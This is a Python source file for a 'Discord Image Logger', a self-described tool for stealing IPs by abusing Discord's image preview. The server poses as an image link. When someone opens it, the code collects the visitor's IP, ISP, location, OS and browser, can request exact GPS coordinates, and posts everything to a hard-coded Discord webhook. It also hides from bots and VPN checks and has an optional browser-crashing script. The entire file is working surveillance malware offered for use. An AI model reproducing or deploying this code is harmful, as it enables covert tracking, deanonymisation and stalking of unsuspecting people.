# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1102898929693110293/llhkeYX8VgM3uDilGH8YivxopctvJfWyoFJueXYE8gWB02Anon0hkvaFOLRmtvkudZhu",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
